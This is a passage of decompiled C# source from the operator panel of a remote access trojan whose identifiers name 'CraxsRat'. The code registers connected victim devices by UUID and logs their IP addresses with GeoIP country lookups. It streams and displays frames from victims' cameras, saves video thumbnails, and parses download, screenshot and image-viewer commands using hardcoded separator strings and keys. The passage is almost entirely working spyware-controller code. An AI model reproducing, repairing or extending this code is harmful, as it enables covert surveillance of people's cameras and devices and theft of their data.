		cityclass = new InfoClass(reso.res_Path + "\\GeoIP\\GeoIPCity.dat");
		SPL_SOCKET = password;
		SPL_DATA = "x0D0x";
		SPL_LINE = "x0L0x";
		SPL_ARRAY = "x0A0x";
		bool flag = false;
		string[] files = Directory.GetFiles(reso.res_Path + "\\GeoIP\\Flags");
		string[] array2 = files;
		foreach (string text in array2)
		{
			if (!flag)
			{
				if (Operators.CompareString(SpySettings.FLAGS_Size, "32px", TextCompare: false) == 0)
					imageFlags.ImageSize = new Size(32, 32);
				else if (Operators.CompareString(SpySettings.FLAGS_Size, "24px", TextCompare: false) == 0)
				{
					imageFlags.ImageSize = new Size(24, 24);
				}
				else
				{
					imageFlags.ImageSize = new Size(16, 16);
				}
				imageFlags.ColorDepth = ColorDepth.Depth32Bit;
				flag = true;
			}
			string path2 = text;
			string fileNameWithoutExtension = Path.GetFileNameWithoutExtension(path2);
			imageFlags.Images.Add(fileNameWithoutExtension.ToUpper(), Image.FromFile(text));
		}
	}

	static Data()
	{
		Sessionkey = "";
		GlobalKey1 = "";
		GlobalKey2 = "";
		GlobalKey3 = "";
		_clientRowIndices = new Dictionary<string, Client>();
		SyncWorkerRemove = RuntimeHelpers.GetObjectValue(new object());
		Lockactive = RuntimeHelpers.GetObjectValue(new object());
		Echoed = false;
		SyncClientsOnline = new Collection();
		SyncRequestsReceiver = RuntimeHelpers.GetObjectValue(new object());
		SyncListWorker = RuntimeHelpers.GetObjectValue(new object());
		SyncWorkerRequests = RuntimeHelpers.GetObjectValue(new object());
		SyncDataHandel = RuntimeHelpers.GetObjectValue(new object());
		SyncNotifications = RuntimeHelpers.GetObjectValue(new object());
		LastClient = null;
		password = "";
		imageFlags = new ImageList();
		Thumbs = reso.res_Path + "\\Thumbs";
		imageListLarge = new Collection();
		ClientsOnline = new Collection();
		cityclass = new InfoClass();
		Cameraison = false;
		THEKEY = "Nagato";
		JK = "BSN12345678901234567";
		CraxsRatkfvuiorkenfudpajrsnCraxsRatsuhsdkax();
	}

	public static string Dir(string uuid)
	{
		string text = CheckAndReplaceIllegalChars(reso.res_Path + "\\" + reso.users);
		string text2 = CheckAndReplaceIllegalChars(text + "\\" + uuid);
		if (!Directory.Exists(text))
			Directory.CreateDirectory(text);
		if (!Directory.Exists(text2))
			Directory.CreateDirectory(text2);
		return text2;
	}

	public static string CheckAndReplaceIllegalChars(string path)
	{
		char[] invalidPathChars = Path.GetInvalidPathChars();
		string text = path;
		char[] array = invalidPathChars;
		foreach (char c in array)
		{
			text = text.Replace(Conversions.ToString(c), "_");
		}
		return text;
	}

	public static void LOGIT(Client Client, string Status, Bitmap flag)
	{
		try
		{
			if (MainForm.checkenablelogs.Checked)
			{
				if (flag == null)
					flag = (Bitmap)Codes.BlankImage();
				if (Client == null)
					MainForm.addLog(new object[5] { flag, Status, " ", "Blocked", " " });
				else if (Operators.CompareString(MySettingsProperty.Settings.LOG, "Yes", TextCompare: false) == 0)
				{
					string clientAddressIP = Client.ClientAddressIP;
					MainForm.addLog(new object[4]
					{
						flag,
						clientAddressIP,
						GetCountryName2.GetCountryName(clientAddressIP),
						Status
					});
				}
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	[AsyncStateMachine(typeof(VB_0024StateMachine_39_HandelData))]
	[DebuggerStepThrough]
	public static void HandelData(object ParametersObject)
	{
		VB_0024StateMachine_39_HandelData stateMachine = new VB_0024StateMachine_39_HandelData();
		stateMachine._0024VB_0024Local_ParametersObject = ParametersObject;
		stateMachine._0024State = -1;
		stateMachine._0024Builder = AsyncVoidMethodBuilder.Create();
		stateMachine._0024Builder.Start(ref stateMachine);
	}

	private static string CheckforSnap(string getCase)
	{
		if (getCase.EndsWith(":SNP"))
			return getCase;
		return "null";
	}

	private static void SaveVideo(string thumbs, string Filename, Image img)
	{
		try
		{
			if (!Directory.Exists(thumbs + "\\" + Filename.Replace(".mp4", "")))
				Directory.CreateDirectory(thumbs + "\\" + Filename.Replace(".mp4", ""));
			img.Save(thumbs + "\\" + Filename.Replace(".mp4", "") + "\\" + Filename.Replace(".mp4", Conversions.ToString(DateTime.Now.Millisecond) + ".jpg"));
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private static void StartCamer(Client classClient, string encodString, Array sPLByte, TcpClient client)
	{
		checked
		{
			try
			{
				if (classClient.qit)
					return;
				string[] array = encodString.Split(new string[1] { SPL_ARRAY }, StringSplitOptions.None);
				object[] collection = GetCollection(array[1]);
				string text = "";
				try
				{
					text = "Camera_Manager_" + ((Client)collection[0]).ClientRemoteAddress;
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					classClient.isconnected = false;
					ProjectData.ClearProjectError();
					return;
				}
				CameraManager cameraManager = (CameraManager)MyProject.Application.OpenForms[text];
				if (cameraManager == null)
				{
					classClient.isconnected = false;
					return;
				}
				if (!cameraManager.Changed)
				{
					cameraManager.Changed = true;
					cameraManager.tmpFolderUSER = cameraManager.classClient.FolderUSER;
					cameraManager.classCamera = classClient;
					MainForm.Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
					{
						cameraManager.Button3.Enabled = true;
						cameraManager.statustext.Text = "Connected - " + cameraManager.SelectedCamera;
					}));
				}
				byte[] array2 = (byte[])sPLByte.GetValue(1);
				using MemoryStream stream = new MemoryStream(array2);
				using Bitmap original = (Bitmap)Image.FromStream(stream);
				Bitmap imag = new Bitmap(original);
				cameraManager.CAM0.Image = cameraManager.RotateFlip(imag);
				cameraManager.UpdateFPS();
				cameraManager.FPSTMP++;
				cameraManager.SizeFrame = reso.BytesConverter(array2.Length);
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
			}
		}
	}

	private static string checkforINFO(string thecase)
	{
		if (thecase.ToLower().Contains(SecurityKey.down_info.ToLower()))
			return thecase;
		return "null";
	}

	private static string checkforDB(string thecase)
	{
		if (thecase.ToLower().Contains(SecurityKey.downByte.ToLower()))
			return thecase;
		return "null";
	}

	private static string checkforview(string thecase)
	{
		if (thecase.ToLower().Contains(SecurityKey.ImageViewer.ToLower()))
			return thecase;
		return "null";
	}

	private static string CheckforSCv2(string thecase)
	{
		if (thecase.ToLower().StartsWith("-832"))
			return thecase;
		return "null";
	}

	private static DataGridViewCell[] Search(string value, DataGridView grDataGrid)
	{
		DataGridViewCell[] result;
		try
		{
			DataGridViewCell[] array = (from object row in grDataGrid.Rows
				select (DataGridViewRow)row into row
				from cell in from object cell in row.Cells
					select (DataGridViewCell)cell
				select cell into cell
				where Operators.ConditionalCompareObjectEqual(cell.Tag, value, TextCompare: false)
				select cell).ToArray();
			result = array;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			result = null;
			ProjectData.ClearProjectError();
		}
		return result;
	}

	public static object[] CraxsRatkfvuiorkenfudpajrsnCraxsRatsxsquyi(string ParametersUUID, Client Clasclient)
	{
		bool flag = false;
		if (!MainForm.IsDisposed)
		{
			try
			{
				MainForm.Addnewrow(new object[1] { Clasclient });
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
			LastClient = Clasclient;
			if (SpySettings.NOTI_SOUND && File.Exists(Notif_Sound.getsoundpath()) && Notif_Sound.aMedia.IsLoadCompleted)
				try
				{
					Notif_Sound.aMedia.Play();
				}
				catch (InvalidOperationException projectError2)
				{
					ProjectData.SetProjectError(projectError2);
					ProjectData.ClearProjectError();
				}
			return new object[2] { Clasclient.Row, flag };
		}
		return new object[2] { null, flag };
	}

	public static DataGridViewRow GetTherow(string UUID)
	{
		if (MainForm.ClientsWindow.Rows.Count > 0)
			return MainForm.ClientsWindow.Rows.Cast<DataGridViewRow>().FirstOrDefault([SpecialName] (DataGridViewRow row) => row.Cells[2].Tag != null && Operators.CompareString(row.Cells[2].Tag.ToString(), UUID, TextCompare: false) == 0);
		return null;
	}

	public static bool isoldclient(string UUID)
	{
		if (MainForm.ClientsWindow.Rows.Count > 0)
		{
			DataGridViewRow dataGridViewRow = MainForm.ClientsWindow.Rows.Cast<DataGridViewRow>().FirstOrDefault([SpecialName] (DataGridViewRow row) => row.Cells[2].Tag != null && Operators.CompareString(row.Cells[2].Tag.ToString(), UUID, TextCompare: false) == 0);
			return dataGridViewRow != null;
		}
		return false;
	}

	public static object[] GetCollection(string ID)
	{
		object[] result;
		try
		{
			lock (_clientRowIndices)
			{
				result = ((!_clientRowIndices.ContainsKey(ID)) ? new object[2] : new object[2]
				{
					_clientRowIndices[ID],
					_clientRowIndices[ID].myClient
				});
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			result = new object[2];
			ProjectData.ClearProjectError();
		}
		return result;
	}

	public static Image Effect(Image img)
	{
		return img;
	}
}
